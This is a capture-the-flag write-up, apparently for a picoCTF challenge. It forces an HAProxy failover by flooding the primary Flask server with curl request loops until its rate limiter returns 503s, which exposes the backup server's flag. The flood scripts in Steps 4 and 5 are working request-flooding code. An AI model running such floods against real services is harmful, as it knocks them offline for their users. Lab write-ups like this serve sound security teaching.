Challenge Overview

This challenge presents a high-availability system with:

    HAProxy load balancer (configuration provided)

    Two backend servers: primary (port 8000) and backup (port 9000)

    Flask application with global rate limiting (300 requests/minute)

    Flag only visible when IS_BACKUP="yes" environment variable is set

Step 1: Analyze the Configuration Files
haproxy.cfg Analysis
bash

cat haproxy.cfg

Key findings:

    Primary server: s1 *:8000 (main target)

    Backup server: s2 *:9000 (marked with backup flag)

    Health checks every 2 seconds (inter 2s)

    Server marked DOWN after 2 failed checks (fall 2)

    Server marked UP after 3 successful checks (rise 3)

app.py Analysis
bash

cat app.py

Key findings:

    Flag only shown when os.getenv("IS_BACKUP") == "yes"

    Global rate limiter: 300 requests per minute

    Rate limit exceeded returns 503 Service Unavailable

Step 2: Understand the Attack Vector

The load balancer only sends traffic to backup if primary is DOWN. To force failover:

    Trigger rate limiter on primary (cause 503 errors)

    HAProxy health checks see 503s and mark primary DOWN

    Traffic redirects to backup server

    Backup server shows the flag

Step 3: Initial Reconnaissance

Check the challenge website:
bash

curl http://mysterious-sea.picoctf.net:65138/

Response shows: "No flag in this service" (confirming we're on primary)
Step 4: Launch Attack - Take Down Primary Server
Terminal 1: Constant Pressure
bash

# Hammer the server continuously to trigger rate limit
while true; do
    curl -s http://mysterious-sea.picoctf.net:65138/ > /dev/null
    echo -n "."
done

Alternative: More Aggressive Attack
bash

# Parallel requests for faster rate limit trigger
while true; do
    for i in {1..50}; do
        curl -s http://mysterious-sea.picoctf.net:65138/ > /dev/null &
    done
    sleep 1
done

Step 5: Monitor for Failover
Terminal 2: Watch for Flag
bash

# Monitor for flag appearance
while true; do
    clear
    echo "🔍 Checking for flag... (Press Ctrl+C to stop)"
    echo "--- $(date) ---"
    
    RESPONSE=$(curl -s http://mysterious-sea.picoctf.net:65138/)
    
    if [[ $RESPONSE != *"No flag in this service"* ]] && [[ $RESPONSE != *"503"* ]] && [[ $RESPONSE != *"Rate limit"* ]]; then
        echo "🎉🎉🎉 FLAG FOUND! 🎉🎉🎉"
        echo "$RESPONSE" | grep -o 'picoCTF{.*}'
        break
    else
        echo "⏳ Waiting for failover..."
    fi
    sleep 2
done

Step 6: Observe Attack Progress

    Initial phase: Terminal 1 shows dots (successful requests to primary)

    Rate limit triggered: After ~300 requests, primary starts returning 503

    HAProxy detection: Takes 4-6 seconds (2 health check cycles) to mark primary DOWN

    Failover window: Traffic switches to backup server

    Flag appears: Terminal 2 shows flag (may be brief)

Step 7: Handle Rate Limit on Backup

If both servers become rate-limited (global limiter):
bash

# Wait 60 seconds for rate limit to reset
sleep 60

# Check for flag
curl http://mysterious-sea.picoctf.net:65138/

